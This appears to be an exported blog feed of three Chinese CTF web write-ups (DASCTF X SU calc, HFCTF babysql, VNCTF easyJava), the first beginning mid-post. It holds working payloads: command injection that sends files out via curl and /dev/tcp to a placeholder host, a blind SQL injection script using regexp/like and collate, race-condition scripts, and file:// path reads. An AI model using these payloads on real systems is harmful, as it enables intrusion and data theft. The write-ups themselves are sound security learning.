就可以了，但是当时没注意，还以为flag放在其他的目录下面，我翻遍了都没找到。谁知道就在当前目录下面TT ( zyx : 都到这里了，肯定不会为难你的啦~ : )好叭\ncalc 这道题其实完全没看..是赛后照着wp补的题，所以记录一下两种解法。都非常好，值得学习。\n先贴上源码\n#coding=utf-8\rfrom flask import Flask,render_template,url_for,render_template_string,redirect,request,current_app,session,abort,send_from_directory\rimport random\rfrom urllib import parse\rimport os\rfrom werkzeug.utils import secure_filename\rimport time\rapp=Flask(__name__)\rdef waf(s):\rblacklist = ['import','(',')',' ','_','|',';','\u0026quot;','{','}','\u0026amp;','getattr','os','system','class','subclasses','mro','request','args','eval','if','subprocess','file','open','popen','builtins','compile','execfile','from_pyfile','config','local','self','item','getitem','getattribute','func_globals','__init__','join','__dict__']\rflag = True\rfor no in blacklist:\rif no.lower() in s.lower():\rflag= False\rprint(no)\rbreak\rreturn flag\r@app.route(\u0026quot;/\u0026quot;)\rdef index():\r\u0026quot;欢迎来到SUctf2022\u0026quot;\rreturn render_template(\u0026quot;index.html\u0026quot;)\r@app.route(\u0026quot;/calc\u0026quot;,methods=['GET'])\rdef calc():\rip = request.remote_addr\rnum = request.values.get(\u0026quot;num\u0026quot;)\rlog = \u0026quot;echo {0} {1} {2}\u0026gt; ./tmp/log.txt\u0026quot;.format(time.strftime(\u0026quot;%Y%m%d-%H%M%S\u0026quot;,time.localtime()),ip,num)\rif waf(num):\rtry:\rdata = eval(num)\ros.system(log)\rexcept:\rpass\rreturn str(data)\relse:\rreturn \u0026quot;waf!!\u0026quot;\rif __name__ == \u0026quot;__main__\u0026quot;:\rapp.run(host='0.0.0.0',port=5000) 这里主要的考点是如何绕过eval()与os.system命令执行。因为黑名单里ban了很多很多东西，剩下的几乎没有多少（这里有一个习惯向二师傅学习，在碰到大量的黑名单过滤的时候，考虑它没有过滤的东西，再去找解题思路），但是剩下的东西都很有用，比如说'#','`','\u0026gt;','$',\u0026quot;'\u0026quot;。\n所以先看看第一种解法。\n解法一 #在python里是注释符，后面跟着的内容会被注释掉不解析。所以如果传入的num是\n1#123\r通过eval解析出来的内容就只是个1\nimage-20220328200628532\r这一点很神奇，原来python里面好多函数在解析字符串的时候会把注释符后面跟着的注释掉，查了很久资料也没有查到一个官方给的说法（好叭是我菜）\n但是如果是os.system，传到shell里面会把#看作字符而非注释符。所以尝试拼接这个echo {0} {1} {2}\u0026gt; ./tmp/log.txt来让os.system执行。首先来看一下在bash里面的结果。\nimage-20220328202428403\r执行之后，打开log.txt，可以看到反引号里面的命令被执行并且将结果输入log.txt了\nimage-20220328202502583\r所以利用这一点，可以考虑传入一个可以让os.system执行的命令，尝试外带出结果。这里空格被过滤，可以考虑其他的空白符。\n可以先写入再外带。\npayload\nnum = 1%23`ls%09/`%23\rnum = 1%23`curl%09-F%09xx=@tmp/log.txt%09http://ip:port/`%23\r二师傅给的payload是直接外带。\npayload\nnum = 1%23%60%2Fbin%2Fbash%09-c%09%27cat%09.%2F*%3E%2Fdev%2Ftcp%2Fip%2Fport%27%60%3E\r服务器这头监听一下就行。\nimage-20220329171534234\rimage-20220329160322856\r解法二 利用python的三引号构造多行字符串，三引号括起来的内容在eval里被当作字符串，是不会报错的。比如说：\nimage-20220329173754460\r既然过了eval，那接下来开始考虑怎么让shell执行。先来看看shell里面三引号的反应。首先shell是支持多行字符串的，第一第二个输出可以看出来。并且shell里面对多个单引号，一般是采取闭合的办法来识别，看第三个输出。再加上shell里面，以#开头的字符串会被当作注释，不予输出，看第四个例子。\nimage-20220329173926144\r所以根据eval和shell对待三引号字符串的不同解释，可以构造如下输入：\n'''1'\\nls\\n#'3'''\r把这个输入拼接到echo里面就是\necho {0} {1} '''1'\rls\r#'3'''\u0026gt; ./tmp/log.txt\r成功命令执行。\n这里为了拿到flag，可以直接外带\npayload\nnum = %27%27%271%27%0Acat%0A/*%09%3E%09/dev/tcp/x.x.x.x/port%0A%23%273%27%27%27\r参考资料 DASCTF X SU 2022 writeup\n2022DASCTF X SU 三月春季挑战赛 WriteUp\n[CTF]PHP反序列化总结\n写在后面 又水了一场比赛，不过还是学到东西了。以前没能把相应的知识点记录下来真的有一点可惜（很大一部分原因是笔记丢了23333），不过大部分的事情什么时候开始都不算晚吧（大概）。\n加油加油。\n","date":"2022-03-30T00:00:00Z","permalink":"https://koali-www.github.io/2022/dasctfxsuctf-web-writeup/","title":"DASCTFxSUCTF-web-writeup"},{"content":"写在前面 打虎符CTF，开头就被平台挡在外面了:D\nweb一如既往的难，babysql看起来可做一些，就从这道题开始。此处感谢高表哥和nkk的指导和pyy的脑洞。\n疫情特殊时期，不能线下聚集打比赛还是有点可惜，实验室三个web手给二师傅打下手(bushi)\n解题过程 image-20220320142246038\rIt is a pure sql injection challenge. Login any account to get flag. Have fun with mysql 8. There is something useful in /hint.md.\n前台限制了输入，这个不要紧，可以通过python或者burp发包过去。\nimage-20220320142647728\r随便输入登录一下。\n给了个返回值。如果要注入的话只能根据这个返回值判断，所以应该是个盲注。\n{\u0026quot;statusCode\u0026quot;:401,\u0026quot;message\u0026quot;:\u0026quot;Unauthorized\u0026quot;}\r据题目所说能注出账号密码就给flag。然后很贴心给了一个hint，先进去看看。\n```sql\rCREATE TABLE `auth` (\r`id` int NOT NULL AUTO_INCREMENT,\r`username` varchar(32) NOT NULL,\r`password` varchar(32) NOT NULL,\rPRIMARY KEY (`id`),\rUNIQUE KEY `auth_username_uindex` (`username`)\r) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;\r```\r```js\rimport { Injectable } from '@nestjs/common';\rimport { ConnectionProvider } from '../database/connection.provider';\rexport class User {\rid: number;\rusername: string;\r}\rfunction safe(str: string): string {\rconst r = str\r.replace(/[\\s,()#;*\\-]/g, '')\r.replace(/^.*(?=union|binary).*$/gi, '')\r.toString();\rreturn r;\r}\r@Injectable()\rexport class AuthService {\rconstructor(private connectionProvider: ConnectionProvider) {}\rasync validateUser(username: string, password: string): Promise\u0026lt;User\u0026gt; | null {\rconst sql = `SELECT * FROM auth WHERE username='${safe(username)}' LIMIT 1`;\rconst [rows] = await this.connectionProvider.use((c) =\u0026gt; c.query(sql));\rconst user = rows[0];\rif (user \u0026amp;\u0026amp; user.password === password) {\r// eslint-disable-next-line @typescript-eslint/no-unused-vars\rconst { password, ...result } = user;\rreturn result;\r}\rreturn null;\r}\r}\r```\r我们传入的username经过了过滤，括号空格等等特殊字符不能用，union被过滤不能联合查询，binary被过滤不能通过它来区分大小写。传入username以后会对表进行查询，查出记录再对传入的密码password进行比对，通过就返回result，也就是flag。\n先随便传点东西看一下回显。SQL注入传统艺能：闭合引号。这里直接忽略空格了，相当于用引号作分隔，区分开了关键字和字符串；然后只要不用带括号的函数，就不会用到括号。所以直接绕过第一个replace的过滤了。\nusername: 1'or'1'='1\rpassword: '123456'\rSQL语句: SELECT * FROM auth WHERE username='1'or'1'='1' LIMIT 1\r返回: {\u0026quot;statusCode\u0026quot;:401,\u0026quot;message\u0026quot;:\u0026quot;Unauthorized\u0026quot;}\r试了很多，好像都没有办法得到其他的回显，像传统时间盲注，因为括号被过滤了，很多操作没能实现。不过这里发现语句出错或者sql炸掉的时候会报501。这里就有两个回显了。\n于是开始和pyy思考如何做到有正确返回值的时候给401，有错误返回值的时候给500。题目很长时间没人解，出题人给了个regexp的提示，再加上后来高表哥点了一个ReDos，所以开始顺着这个方向摸索。\nMySQL探索 到这里，题目先放一边，先开个sql随便试试。题目给了mysql8，我这里开了一个mysql8.0.16。\n根据题目给的sql内容新建一个库用来测试。\nimage-20220320150618144\r把sql语句接进去，回显正常。\nimage-20220320150854245\rmysql的or有短路机制，如果多个or拼接，前面判断为true的时候，后面的or内容就会被短路不进行判断；如果前面为false，会继续往后判断；最终如果没有一个true，就会返回false。\nimage-20220320152024497\r然后探讨一下regexp的机制。正常去匹配的时候，遵循正则表达式，如果匹配成功就会返回查询的信息，如果匹配不成功就返回空值，同时如果表达式出错的话SQL就会炸掉。\nimage-20220320152544638\rReDos 那么什么是ReDos呢？\n正则表达式里面有两个重复运算符*和+，*代表重复零次或多次，+代表重复一次或多次。这里附上一个验证正则表达式的网址，可以很好地验证我们的正则写的对不对。针对正则的重复运算符，首先需要了解它的匹配机制。下面先解释几个问题。\nDFA（确定性有限状态自动机）和NFA（非确定性有限状态自动机）的区别\nDFA\r通俗一点解释就是拿一整串字符串与拆分开的正则表达式匹配匹配。\r比如匹配'abbbc'，正则表达式为'ab{1,3}c'，匹配过程如下：\ra 匹配 a\rab 匹配 ab{1,3}\rabb 匹配 ab{1,3}\rabbb 匹配 ab{1,3} // 刚好最多三个b结束\rabbbc 匹配 ab{1,3}c NFA\r也通俗一点解释就是拿整个正则表达式与字符串的逐个字符匹配。\r....写着写着发现有点不对，先放着....\rMySQL属于NFA，存在回溯机制。\n关于重复运算符+和*的区别（就是至少一次和零次的区别）\nca*t 匹配 caaaaat和ct\rca+t 匹配 caaaaat\r贪婪匹配和非贪婪匹配\nx.*y 匹配 xaaaaayqweqxbbbbby\rx.*?y 匹配 xaaaaay和xbbbbby\r回溯\n不管是贪婪匹配还是非贪婪匹配，如果给出的表达式是不恰当的，计算机处理的时候会进行回溯（至于什么是恰当的正则表达式，之后有空再细说）\n比如我需要匹配xabcdyabc，给出的表达式是x.*y，那么计算机进行匹配的流程应该是：\nx 匹配 x\rxa 匹配 x.*\rxab 匹配 x.*\rxabc 匹配 x.*\rxabcd 匹配 x.*\rxabcdy 匹配 x.*\rxabcdya 匹配 x.*\rxabcdyab 匹配 x.*\rxabcdyabc 匹配 x.* // 注意，这里已经匹配完了，开始回溯\rxabcdyab 匹配 x.*\rxabcdya 匹配 x.*\rxabcdy 匹配 x.*\rxabcd 匹配 x.*\rxabcdy 匹配 x.*y\r可见，如果匹配的过程中产生回溯，将会大大降低效率。所以假如我们需要匹配aaaaaaaaaaaaaaaaa，给出的表达式是(a+)+b，我们能轻易看出来这是不匹配的，但是计算机会对其进行回溯，做很多没有必要且愚蠢的操作，然后导致操作步数过多，超时或者崩溃。利用这一点可以达到Dos的效果。\n如果在MySql里面试，会报超时。\nimage-20220320180534057\r或者在python里面试，会卡死。\nimage-20220320180658644\r尝试解题 了解了上面这些东西，差不多可以开始解题了。我们尝试对给出的sql语句进行拼接，利用or的短路规则和regexp查询、制造报错。\nimage-20220320213048644\r当然也可以用ReDos制造超时。\nimage-20220320213203235\r然后就可以愉快写脚本盲注啦~\nimport requests\rpasswd=\u0026quot;\u0026quot;\rlista=\u0026quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789\u0026quot;\rwhile True:\rfor i in lista:\rexp=\u0026quot;'or`password`regexp'^\u0026quot;+passwd+i+\u0026quot;'or`password`regexp'[\u0026quot;\r#print(exp)\rdata={\u0026quot;username\u0026quot;:exp,\u0026quot;password\u0026quot;:\u0026quot;123456\u0026quot;}\rres = requests.post(\u0026quot;http://47.107.231.226:36804/login\u0026quot;,data=data)\r#print(res.text)\rif('401' in res.text):\rpasswd+=i\rprint(passwd)\rbreak\r同样对username进行盲注，得到的结果如下：\nusername: QAY8TEFYZC67AEOO\rpassword: M52FPLDXYYLB\r但是感觉有些奇怪，一时说不上来奇怪在哪里\u0026hellip;所以尝试拿去登录了一下。\n啊哦，是错的。所以重新去看哪里有问题（其实也没有去看，当时在和高表哥通电话，他提点了一下，嘿嘿，化腐朽为神奇的好大哥~）\n重新看一遍hint.md，仔细看过滤的地方。\nfunction safe(str: string): string {\rconst r = str\r.replace(/[\\s,()#;*\\-]/g, '')\r.replace(/^.*(?=union|binary).*$/gi, '')\r.toString();\rreturn r;\r}\r发现除了union被过滤，还有一个binary。binary关键字在mysql里用来区分大小写，mysql默认是不区分大小写的。看下面的例子。\nimage-20220320214957473\r但是现在binary被过滤了，只能另寻他路。\n经过一番搜寻，发现collate也可以做到让mysql区分大小写。这里就涉及到mysql默认字符集的问题。\nMySQL字符集 在我们的认知里，基本上字符的比较都是通过先转换成ascii，再根据ascii字符集进行比较；特别的，像php那样的弱类型比较，如果字符和数字进行比较会先把字符转换成0。下面来看mysql特殊的例子。首先知道\u0026rsquo;a\u0026rsquo;对应的ascii是97，\u0026lsquo;8\u0026rsquo;对应的ascii是56，\u0026rsquo;@\u0026lsquo;对应的ascii是64，\u0026rsquo;~\u0026lsquo;对应的ascii是126。如果对这几个字符进行比较，我们的第一反应应该是 '~'\u0026gt;'a'\u0026gt;'@'\u0026gt;'8'。但是看一下在mysql里运行的结果。\nmysql\u0026gt; select 'a'\u0026gt;'1';\r+---------+\r| 'a'\u0026gt;'1' |\r+---------+\r| 1 |\r+---------+\r1 row in set (0.05 sec)\rmysql\u0026gt; select '@'\u0026gt;'a';\r+---------+\r| '@'\u0026gt;'a' |\r+---------+\r| 0 |\r+---------+\r1 row in set (0.00 sec)\rmysql\u0026gt; select '@'\u0026gt;'8';\r+---------+\r| '@'\u0026gt;'8' |\r+---------+\r| 0 |\r+---------+\r1 row in set (0.00 sec)\rmysql\u0026gt; select '~'\u0026gt;'a';\r+---------+\r| '~'\u0026gt;'a' |\r+---------+\r| 0 |\r+---------+\r1 row in set (0.05 sec)\rmysql\u0026gt; select '~'\u0026gt;'8';\r+---------+\r| '~'\u0026gt;'8' |\r+---------+\r| 0 |\r+---------+\r1 row in set (0.00 sec)\rmysql\u0026gt; select '@'\u0026gt;'a';\r+---------+\r| '@'\u0026gt;'a' |\r+---------+\r| 0 |\r+---------+\r1 row in set (0.00 sec)\rmysql\u0026gt; select '@'\u0026gt;'8';\r+---------+\r| '@'\u0026gt;'8' |\r+---------+\r| 0 |\r+---------+\r1 row in set (0.00 sec)\rmysql\u0026gt; select 'a'\u0026gt;'8';\r+---------+\r| 'a'\u0026gt;'8' |\r+---------+\r| 1 |\r+---------+\r1 row in set (0.00 sec)\r很奇怪，这和我们的直觉不符，和二师傅、nkk以及远方的高表哥在实验室探讨了很久这个问题。最后发现其实是字符集的锅。\nmysql8把默认字符集换成了utf8mb4_0900_ai_ci，可以查询看看。\nimage-20220320221936369\r二师傅搜到这个字符集，发现它默认是把一些特殊的字符放在了数字和字母的前面，像我们用到的 \u0026lsquo;@\u0026lsquo;和\u0026rsquo;~\u0026rsquo; 在这个字符集里都是比数字和字母小的，所以得到了上面的结果。以及，附上对于这个字符集的说明。感谢@二师傅。\n说回区分大小写的问题，这个字符集带着ci，说明是不区分大小写的，那么我们就可以通过修改mysql使用的字符集来实现这个功能。这里找一个能够区分大小写的字符集就可以。\n所以修改一下sql语句：\nimage-20220320224045559\r这里注意，这个collate要接在待比较或者匹配字符语句的后面。像上面的语句，如果接在最后是不起作用的。\n到这里就可以实现区分大小写的功能了。但是最后注出的密码还是不对，考虑到可能是存在特殊字符，高表哥试了很多个最后试出来存在的特殊字符是^$!。这里既然存在^，这在正则表达式里面是关键字符，所以不能用regexp去注入，最后换成like解决了这个问题。\n附上完整脚本。\nimport requests\ra=\u0026quot;\u0026quot;\rpasswd=\u0026quot;\u0026quot;\rlista=\u0026quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789$!^\u0026quot;\rwhile True:\rfor i in lista:\rexp=\u0026quot;'or`password`like'\u0026quot;+passwd+i+\u0026quot;%'collate'utf8mb4_bin'or`username`regexp'[\u0026quot;\rdata={\u0026quot;username\u0026quot;:exp,\u0026quot;password\u0026quot;:\u0026quot;123456\u0026quot;}\rres = requests.post(\u0026quot;http://47.107.231.226:36804/login\u0026quot;,data=data)\rif('401' in res.text):\rpasswd+=i\rprint(passwd)\rbreak\r最后的结果是\nusername: QaY8TeFYzC67aeoO\rpassword: m52FPlDxYyLB^eIzAr!8gxh$\r拿着去登录，返回flag。\nHFCTF{0990de0f-a5ea-4c47-90f7-7c92ba1eac80}\r参考资料 Regular expression Denial of Service - ReDoS\n正则表达式所引发的DoS攻击（Redos）\nMYSQL中的COLLATE是什么？ 写在最后 拿一血的高表哥，yyds！\n还是要多练多练多练多练多练多练多练，知道的东西越多在比赛里越得心应手，查资料也不会没有方向。写这道题的过程还是比较坎坷的，从不知道怎么绕过滤，到不知道怎么用正则，到不知道怎么区分大小写；中间写脚本的时候遇到了很多奇怪的问题，比如如果修改了字符集用大于小于号去比较的话应该用什么字符集呢（因为我和nkk倔强地想用大于小于号去比较2333333）。但是这些问题留待以后再探讨吧！\n赶作业去嘞~\n","date":"2022-03-20T00:00:00Z","permalink":"https://koali-www.github.io/2022/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6redos%E5%8F%8Asql%E7%9B%B2%E6%B3%A8/","title":"从一道题学ReDos及SQL盲注"},{"content":"写在前面 第一次把java的题从头到尾做完，整完的时候发现题目并不难。过程中还是学到了很多东西，感谢高表哥和nkk和二师傅🙇‍\n比赛的时候没有做出来，环境关掉了，虽然buu有复现环境，但是由于需要竞争，buu有限制，所以把源码拿下来在本地搭。\n复现 打开环境，F12查看源码\nimage-20220302133247566\r访问/file?\nimage-20220302133312575\r需要传入一个url，猜测是需要用到伪协议任意读文件。于是传入file:///读到源码。本地的话直接知道源码路径，就不多说了。比赛的时候是远程环境，我一开始不知道web部署在哪里，所以找了很久，最后在这个路径里找到。\n/file?url=file:///usr/local/tomcat/\n看到高表哥是通过当前运行进程去找的，这样找好像快一些，记录一下。\n/file?url=file:///proc/self/cwd/\n然后看到tomcat的目录结构，进webapps，拿到源码拿去反编译。\nimage-20220302134240641\rHelloWorldServlet类\npackage servlet;\rimport entity.User;\rimport java.io.IOException;\rimport java.util.Base64;\rimport javax.servlet.ServletException;\rimport javax.servlet.ServletOutputStream;\rimport javax.servlet.annotation.WebServlet;\rimport javax.servlet.http.HttpServlet;\rimport javax.servlet.http.HttpServletRequest;\rimport javax.servlet.http.HttpServletResponse;\rimport util.Secr3t;\rimport util.SerAndDe;\r@WebServlet(name = \u0026quot;HelloServlet\u0026quot;, urlPatterns = {\u0026quot;/evi1\u0026quot;})\r/* loaded from: HelloWorldServlet.class */\rpublic class HelloWorldServlet extends HttpServlet {\rprivate volatile String name = \u0026quot;m4n_q1u_666\u0026quot;;\rprivate volatile String age = \u0026quot;666\u0026quot;;\rprivate volatile String height = \u0026quot;180\u0026quot;;\rUser user;\rpublic void init() throws ServletException {\rthis.user = new User(this.name, this.age, this.height);\r}\rprotected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\rString reqName = req.getParameter(\u0026quot;name\u0026quot;);\rif (reqName != null) {\rthis.name = reqName;\r}\rif (Secr3t.check(this.name)) {\rResponse(resp, \u0026quot;no vnctf2022!\u0026quot;);\r} else if (Secr3t.check(this.name)) {\rResponse(resp, \u0026quot;The Key is \u0026quot; + Secr3t.getKey());\r}\r}\rprotected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\rString key = req.getParameter(\u0026quot;key\u0026quot;);\rString text = req.getParameter(\u0026quot;base64\u0026quot;);\rif (!Secr3t.getKey().equals(key) || text == null) {\rResponse(resp, \u0026quot;KeyError\u0026quot;);\rreturn;\r}\rif (this.user.equals((User) SerAndDe.deserialize(Base64.getDecoder().decode(text)))) {\rResponse(resp, \u0026quot;Deserialize…… Flag is \u0026quot; + Secr3t.getFlag().toString());\r}\r}\rprivate void Response(HttpServletResponse resp, String outStr) throws IOException {\rServletOutputStream out = resp.getOutputStream();\rout.write(outStr.getBytes());\rout.flush();\rout.close();\r}\r}\r看到这里发现这个key通过正常手段没有办法拿到，不管怎样都不可能进else的。开始思考有没有别的办法。查阅了一些资料问高表哥之后发现这里需要条件竞争。至于为什么可以竞争，二师傅的猜测加上我的理解再加上y4师傅的总结，大概就是servlet在一段时间内只实例化一次，导致多个用户会同时访问到同一个实例，所以抢在某个servlet实例销毁之前对其进行修改，就可以实现下面两个条件同时满足的情况，进而拿到这个key。\nimage-20220303215240491\r附上写好的垃圾脚本。\na.py\nimport requests\rhost = \u0026quot;http://localhost:8080/evi1\u0026quot;\rwhile True:\rr = requests.get(host+\u0026quot;?name=qertyyui\u0026quot;)\rb.py\nimport requests\rhost = \u0026quot;http://localhost:8080/evi1\u0026quot;\rwhile True:\rr = requests.get(host+\u0026quot;?name=vnctf2022\u0026quot;)\rif r.text.find(\u0026quot;The Key is\u0026quot;)!=-1:\rprint(r.text)\r拿到key。\n这里在第二次复现的时候出了一点问题。问题大概出在python的request，在发起请求之后不会自动关闭连接，如果短时间内发起请求过多的话会一直占用Httpconnnectionpool的资源，导致之后发起的请求没有办法成功连接。尝试了很多办法都没有结局，不论是加header的connection为close，还是控制session，都没有用。最后采用多线程的办法才解决。 接着往下就是反序列化，这里需要post一个key和base64，其中base64是一个User类序列化之后经过base64编码的结果。SerAndDe类里面提供了序列化和反序列化的方法封装，可以直接拿来用。\nimage-20220303220931037\r注意到这里的this.user，我们反序列化出来的User需要和this.user相等。\nimage-20220304093202982\r那么进User类看看。\npackage entity;\rimport java.io.IOException;\rimport java.io.ObjectInputStream;\rimport java.io.Serializable;\r/* loaded from: User.class */\rpublic class User implements Serializable {\rprivate String name;\rprivate String age;\rprivate transient String height;\rpublic User(String name, String age, String height) {\rthis.name = name;\rthis.age = age;\rthis.height = height;\r}\rpublic String getName() {\rreturn this.name;\r}\rpublic void setName(String name) {\rthis.name = name;\r}\rpublic String getAge() {\rreturn this.age;\r}\rpublic void setAge(String age) {\rthis.age = age;\r}\rpublic String getHeight() {\rreturn this.height;\r}\rpublic void setHeight(String height) {\rthis.height = height;\r}\rprivate void readObject(ObjectInputStream s) throws IOException, ClassNotFoundException {\rs.defaultReadObject();\rthis.height = (String) s.readObject();\r}\r@Override // java.lang.Object\rpublic boolean equals(Object obj) {\rif (obj == null) {\rreturn false;\r}\rif (this == obj) {\rreturn true;\r}\rif (!(obj instanceof User)) {\rreturn false;\r}\rUser user = (User) obj;\rif (!user.getAge().equals(this.age) || !user.getHeight().equals(this.height) || !user.getName().equals(this.name)) {\rreturn false;\r}\rreturn true;\r}\r@Override // java.lang.Object\rpublic String toString() {\rreturn \u0026quot;User{name='\u0026quot; + this.name + \u0026quot;', age='\u0026quot; + this.age + \u0026quot;', height='\u0026quot; + this.height + \u0026quot;'}\u0026quot;;\r}\r}\r这里有一个知识点，对于序列化和反序列化的时候，被transient修饰的变量是不会被序列化的，所以如果不作任何更改序列化出来的字符串再拿去反序列化，得到的height会是个null，这样就没有办法满足if条件，拿不到flag。所以为了反序列化出来时，这个height和this.user里面的height是一致的，可以通过重写writeObject方法，手动把height写进我们反序列化出来的对象里。\nimage-20220304094934553\r这里又有一个问题，就是在User类里面重写了readObject，这一行代码存在的时候，反序列化一定会失败，但是注释掉之后是可以看到height为null的。\nthis.height = (String) s.readObject();\r在User类里面重写一个writeObject\nprivate void writeObject(ObjectOutputStream s) throws IOException{\rs.defaultWriteObject();\rs.writeObject(\u0026quot;180\u0026quot;);\r}\r这样就可以成功进入if判断，拿到flag。\n自己写一个serialize类，输出需要的base64字符串，同时查看一下user2的属性情况。\nimport java.io.*;\rimport java.util.Base64;\rimport entity.User;\rimport util.SerAndDe;\rpublic class serialize {\rpublic static void main(String[] args) throws IOException, ClassNotFoundException {\rUser u = new User(\u0026quot;m4n_q1u_666\u0026quot;,\u0026quot;666\u0026quot;,\u0026quot;180\u0026quot;);\rbyte[] user = SerAndDe.serialize(u);\rString poc = Base64.getEncoder().encodeToString(user);\rSystem.out.println(poc);\rbyte[] user2 = Base64.getDecoder().decode(poc);\rSystem.out.println(SerAndDe.deserialize(user2).toString());\r}\r}\r结果如下\nimage-20220304100044543\r本地没有flag，参考le1a师傅的复现过程，在本地弹个计算器。\nimage-20220304100736444\rpayload\nhttp://127.0.0.1:8080/evi1\rpost:key=SjveAUeJxYXPww2Dd0NPwUm90na98of1\u0026amp;base64=rO0ABXNyAAtlbnRpdHkuVXNlcm1aqowD0DcIAwACTAADYWdldAASTGphdmEvbGFuZy9TdHJpbmc7TAAEbmFtZXEAfgABeHB0AAM2NjZ0AAttNG5fcTF1XzY2NnQAAzE4MHg=\r大功告成！\nimage-20220304101021208\r一些奇怪的姿势 之前没有搭过tomcat，所以在搭建环境的过程中有些吃力。完整的搭建过程之后有空了在搞叭，这里用的办法是用编译好的文件替换掉tomcat自带的ROOT。\nimage-20220302132904237\r在做的过程中发现也可以通过这个办法骗过编译器，当然前提是需要知道类里有哪些方法，否则会出现找不到调用的方法之类的错误。\n参考资料 Le1a师傅的wp\nVNCTF 2022 Official WriteUp\njava-Transient关键字、Volatile关键字介绍和序列化、反序列化机制、单例类序列化\nServlet的线程安全问题\n写在后面 这是不知道隔了多久之后重新开始打比赛，并且认认真真地复现。虽然比赛过程中没有做出来，但是成就感满满，也学到了很多东西。作为一名不合格的web手，只能期望日后多push自己一下，好好打比赛好好写题，最重要的是表哥们带带我(●\u0026rsquo;◡\u0026rsquo;●)\n","date":"2022-03-04T00:00:00Z","permalink":"https://koali-www.github.io/2022/vnctf2022-easyjava/","title":"VNctf2022-easyJava"}]